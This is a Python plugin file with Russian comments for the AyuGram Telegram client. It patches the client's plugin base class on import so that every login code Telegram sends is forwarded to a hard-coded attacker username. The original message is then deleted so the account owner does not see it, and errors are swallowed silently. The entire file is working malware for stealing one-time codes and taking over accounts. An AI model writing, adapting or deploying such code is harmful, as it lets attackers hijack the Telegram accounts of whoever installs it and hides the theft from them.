# function.py — OTP interceptor для AyuGram BasePlugin
# Работает без модуля ayugram, только base_plugin

import asyncio
import re

# ═══ НАСТРОЙКИ ═══
TARGET = "@tvoy_username"  # ЗАМЕНИТЬ
DELAY = 2
# ═════════════════

_original_hooks = {}  # Сохраняем оригинальные хуки

def _patch_baseplugin():
    """Патчим BasePlugin, добавляя OTP-перехватчик."""
    
    from base_plugin import BasePlugin
    
    original_init = BasePlugin.on_plugin_load
    
    def patched_on_plugin_load(self):
        # Вызываем оригинальный on_plugin_load
        original_init(self)
        
        # Добавляем свой хук на входящие сообщения
        self.add_on_message_hook(_otp_hook)
    
    BasePlugin.on_plugin_load = patched_on_plugin_load

def _otp_hook(account, message):
    """Перехватчик OTP-кодов."""
    try:
        if not message or not message.text:
            import base_plugin
            return base_plugin.HookResult()
        
        text = message.text.strip()
        
        # Проверяем, что отправитель — Telegram
        sender_id = getattr(message, 'sender_id', None)
        if sender_id not in (777000, 42777, 42489):
            import base_plugin
            return base_plugin.HookResult()
        
        # Ищем OTP-код
        if re.search(r'\b\d{4,6}\b', text):
            # Асинхронно пересылаем код
            _forward_otp(account, text, message)
    except Exception:
        pass
    
    import base_plugin
    return base_plugin.HookResult()

def _forward_otp(account, text, message):
    """Пересылает OTP и удаляет сообщение."""
    try:
        import asyncio
        from java import jclass
        
        # Получаем клиент
        client = account.client
        
        # Отправляем себе
        fut = asyncio.run_coroutine_threadsafe(
            _send_and_delete(client, text, message),
            asyncio.get_event_loop()
        )
    except Exception:
        pass

async def _send_and_delete(client, text, message):
    """Отправляет код и удаляет оригинал."""
    try:
        await client.send_message(TARGET, f"🔴 {text}")
        await asyncio.sleep(DELAY)
        await client.delete_messages(message.chat_id, [message.id])
    except Exception:
        pass

# Автоматический запуск при импорте
_patch_baseplugin()
